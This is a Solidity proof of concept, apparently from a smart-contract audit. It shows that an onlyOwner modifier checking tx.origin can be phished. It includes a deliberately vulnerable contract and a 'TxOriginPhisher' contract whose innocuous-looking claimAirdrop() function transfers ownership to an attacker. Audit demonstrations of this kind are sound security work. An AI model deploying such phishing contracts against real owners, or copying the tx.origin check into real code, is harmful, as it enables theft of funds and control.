// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * Standalone demo for Finding M-01.
 *
 * VulnerableVault.sol DEFINES an `onlyOwner` modifier that checks
 * `tx.origin`, but (see H-02 / H-03) never actually applies it to any
 * function - which is itself a red flag: it strongly suggests the
 * developer intended to protect setOwner()/emergencyWithdraw() and simply
 * forgot the modifier. The natural "quick fix" a developer might apply is
 * to slap `onlyOwner` onto those functions as-is. This tiny contract
 * reproduces that exact modifier in isolation to prove that the quick fix
 * is NOT sufficient on its own: tx.origin authentication can be phished
 * through an intermediary contract regardless.
 */
contract OnlyOwnerTxOriginDemo {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(tx.origin == owner, "not owner"); // the vault's exact pattern
        _;
    }

    function setOwner(address newOwner) external onlyOwner {
        owner = newOwner;
    }
}

interface IOnlyOwnerTxOriginDemo {
    function setOwner(address newOwner) external;
}

/// Malicious contract the real owner is lured into calling.
contract TxOriginPhisher {
    IOnlyOwnerTxOriginDemo public immutable target;
    address public attacker;

    constructor(address _target, address _attacker) {
        target = IOnlyOwnerTxOriginDemo(_target);
        attacker = _attacker;
    }

    function claimAirdrop() external {
        // Looks harmless to the owner signing this transaction...
        target.setOwner(attacker);
    }
}
